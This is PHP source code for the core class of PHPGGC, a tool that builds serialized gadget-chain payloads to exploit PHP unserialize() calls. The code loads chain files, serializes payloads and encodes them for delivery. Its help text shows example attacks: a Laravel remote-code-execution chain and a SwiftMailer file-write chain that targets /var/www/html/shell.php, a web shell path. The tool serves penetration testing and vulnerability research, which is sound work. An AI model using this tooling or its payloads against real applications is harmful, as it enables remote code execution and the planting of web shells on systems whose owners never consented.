<?php
# PHPGGC: PHP Generic Gadget Chains
# Library of generic exploitation vectors for unserialize()
#

class PHPGGC
{
    public static $DIR_GADGETCHAINS = 'gadgetchains';

    protected $has_wrapper = False;
    protected $gadgets;

    public function __construct()
    {
        spl_autoload_register(array($this, 'autoload'));
        $this->gadgets = $this->get_gadget_chains();
    }

    /**
     * Generates a payload from the command line arguments.
     * First, the gadget is loaded, and then it is generated using additional
     * arguments.
     */
    public function generate()
    {
        global $argv;

        $parameters = $this->parse_cmdline($argv);

        if(count($parameters) < 1)
        {
            $this->help();
            return;
        }

        $class = array_shift($parameters);
        $gc = $this->get_gadget_chain($class);

        $parameters = $this->get_type_parameters($gc, $parameters);
        $generated = $this->serialize($gc, $parameters);

        print($generated . "\n");
    }

    /**
     * Gets an instance of the given GadgetChain class.
     */
    public function get_gadget_chain($class)
    {
        $full = strtolower('GadgetChain/' . $class);

        if(!in_array($full, array_keys($this->gadgets)))
        {
            throw new PHPGGC\Exception('Unknown gadget chain: ' . $class);
        }

        return $this->gadgets[$full];
    }

    /**
     * Generates the serialized payload from given gadget and parameters.
     */
    public function serialize($gc, $parameters)
    {
        $gc->load_gadgets();

        $parameters = $gc->pre_process($parameters);
        $payload = $gc->generate($parameters);
        $payload = $this->wrap($payload);

        $serialized = serialize($payload);

        $serialized = $gc->post_process($serialized);
        $serialized = $this->apply_filters($serialized);

        return $serialized;
    }

    /**
     * Includes every file that might contain a gadget.
     */
    protected function include_gadget_chains()
    {
        $files = glob(self::$DIR_GADGETCHAINS . '/*/*/*/chain.php');
        array_map(function ($file)
        {
            include_once $file;
        }, $files);
    }

    /**
     * Loads every available gadget and returns an array of the form
     * class_name => object.
     */
    public function get_gadget_chains()
    {
        $this->include_gadget_chains();

        $classes = get_declared_classes();
        $classes = array_filter($classes, function($class)
        {
            return is_subclass_of($class, '\\PHPGGC\\GadgetChain') &&
                   strpos($class, 'GadgetChain\\') === 0;
        });
        $objects = array_map(function($class)
        {
            return new $class();
        }, $classes);

        # Convert backslashes in classes names to forward slashes,
        # so that the command line is easier to use
        $classes = array_map(function($class)
        {
            return strtolower(str_replace('\\', '/', $class));
        }, $classes);
        return array_combine($classes, $objects);
    }

    public function set_wrapper($file)
    {
        include $file;
        $this->_has_wrapper = true;
    }

    /**
     * Wraps the payload into something else if the user required it.
     * For instance, if a specific unserialize call requires an array, one could
     * build a wrapper function of the likes:
     *
     * function wrapper($description)
     * {
     *     return array('id' => '123', 'data' => $description['payload']);
     * }
     *
     * The returned serialized payload would be an array which contains the
     * payload under the key "data".
     */
    public function wrap($payload)
    {
        if(isset($this->_has_wrapper))
        {
            $payload = call_user_func('wrapper', $payload);
        }

        return $payload;
    }

    public function autoload($class)
    {
        if(strpos($class, 'PHPGGC\\') === 0)
        {
            include_once 'lib/' . str_replace('\\', '/', $class) . '.php';
        }
    }

    #
    # Display
    #

    /**
     * Messages are displayed on stderr so that the payload can be saved into
     * a file if needed.
     */
    function output($message, $r=1)
    {
        $n = str_repeat("\n", $r);
        fwrite(STDERR, $message . $n);
    }

    protected function o($message, $r=1)
    {
        $this->output($message, $r);
    }

    /**
     * Applies command line filters on the serialized payload.
     */
    protected function apply_filters($serialized)
    {
        extract($this->arguments, EXTR_SKIP);

        if(@$base64)
            $serialized = base64_encode($serialized);
        if(@$urlencode)
            $serialized = urlencode($serialized);
        if(@$softencode)
        {
            $keys = str_split("\x00\n\r\t+");
            $values = array_map('urlencode', $keys);
            $serialized = str_replace($keys, $values, $serialized);
        }

        return $serialized;
    }

    protected function list_gc()
    {
        $this->o("");
        $this->o("Gadget Chains");
        $this->o("-------------", 2);

        foreach($this->gadgets as $gadget)
        {
            $this->o($gadget, 2);
        }

        exit(0);
    }

    protected function help()
    {
        $this->o("");
        $this->o("PHPGGC: PHP Generic Gadget Chains");
        $this->o("---------------------------------", 2);

        $this->o("Usage");
        $this->o("  " . $this->_get_command_line(
            '[-h|-l|-w|-h|-s|-u|-b]',
            '<GadgetChain>',
            '[arguments]'
        ), 2);

        $this->o("Optional parameters");
        $this->o("  -h Displays advanced help");
        $this->o("  -l Lists available gadget chains");
        $this->o("  -w <wrapper>");
        $this->o("     Specifies a file containing a function: wrapper(\$payload)");
        $this->o("     This function will be called before the generated gadget is serialized.");
        $this->o("  -s Soft URLencode");
        $this->o("  -u URLencodes the payload");
        $this->o("  -b Converts the output into base64");
        $this->o("");

        $this->o("Examples");
        $this->o("  " . $this->_get_command_line(
            'Laravel/RCE1',
            '\'phpinfo().die();\''
        ));
        $this->o("  " . $this->_get_command_line(
            'SwiftMailer/FW1',
            '/var/www/html/shell.php',
            '/tmp/local_file_to_write'
        ));
        $this->o("");

        exit(0);
    }

    /**
     * Parses the command line arguments.
     */
    protected function parse_cmdline($argv)
    {
        unset($argv[0]);

        $valid_arguments = [
            'help' => false,
            'list' => false,
            'wrapper' => true,
            'softencode' => false,
            'base64' => false,
            'urlencode' => false,
        ];

        $arguments = [
        ];

        $count = count($argv);

        foreach($argv as $i => $arg)
        {
            if($arg{0} == '-')
            {
                $arg = substr($arg, 1);
                $valid = false;

                foreach($valid_arguments as $argument => $has_parameter)
                {
                    if($argument{0} == $arg)
                    {
                        $valid = true;

                        if($has_parameter)
                        {
                            if($count < $i)
                                throw new \PHPGGC\Exception('Parameter ' . $arg . ' expects a value');

                            $arguments[$argument] = $argv[$i+1];
                            
                            # Delete argument's value
                            unset($argv[$i+1]);
                        }
                        else
                        {
                            $arguments[$argument] = true;
                        }

                        break;
                    }
                }
                
                if(!$valid)
                {
                    throw new PHPGGC\Exception('Unknown parameter: ' . $arg);
                }

                # Delete argument
                unset($argv[$i]);
            }
        }

        # Handle optional arguments in case they need to be now.
        # Otherwise, just save them.

        foreach($arguments as $argument => $value)
        {
            switch($argument)
            {
                case 'help':
                    $this->help();
                    break;
                case 'list':
                    $this->list_gc();
                    break;
                case 'wrapper':
                    $this->set_wrapper($value);
                    break;
            }
        }

        $this->arguments = $arguments;

        # Return remaining arguments
        return array_values($argv);
    }

    /**
     * Convert command line parameters into an array of named parameters,
     * specific to the type of payload.
     */
    protected function get_type_parameters($gc, $parameters)
    {
        $arguments = $gc->parameters;

        $values = @array_combine($arguments, $parameters);

        if($values === false)
        {
            $this->o($gc, 2);
            $arguments = array_map(function ($a) {
                return '<' . $a . '>';
            }, $arguments);
            $message = 'Invalid arguments for type "' . $gc->type . '" ' . "\n" .
                       $this->_get_command_line($gc->get_name(), ...$arguments);
            throw new PHPGGC\Exception($message);
        }

        return $values;
    }

    private function _get_command_line(...$arguments)
    {
        return './phpggc ' . implode(' ', $arguments);
    }
}